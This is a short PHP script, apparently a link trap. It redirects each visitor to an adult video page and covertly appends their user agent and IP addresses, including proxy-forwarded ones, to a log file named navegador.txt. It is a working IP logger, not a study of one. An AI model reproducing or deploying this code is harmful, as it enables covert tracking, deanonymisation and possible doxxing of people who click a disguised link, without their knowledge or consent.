<?php

header("Location: https://www.xvideos.com/video39697495/madura_y_jovencito_pingon...");





$ft = fopen("navegador.txt","a");
$user = $_SERVER['HTTP_USER_AGENT'];
fwrite($ft,$user."\r");
$ip = $_SERVER['REMOTE_ADDR'];

if(!empty($ip)){
  fwrite($ft,$ip."\r");
}

$ip2 = $_SERVER['HTTP_CLIENT_IP'];
if(!empty($ip2)){

fwrite($ft,$ip2."\r");


}


$ip3 = $_SERVER["HTTP_X_FORWARDED"];
if(!empty($ip3)){

fwrite($ft,$ip3."\r");

}

$ip4 = $_SERVER["HTTP_X_FORWARDED_FOR"];

if(!empty($ip4)){

fwrite($ft,$ip4);
}


?>
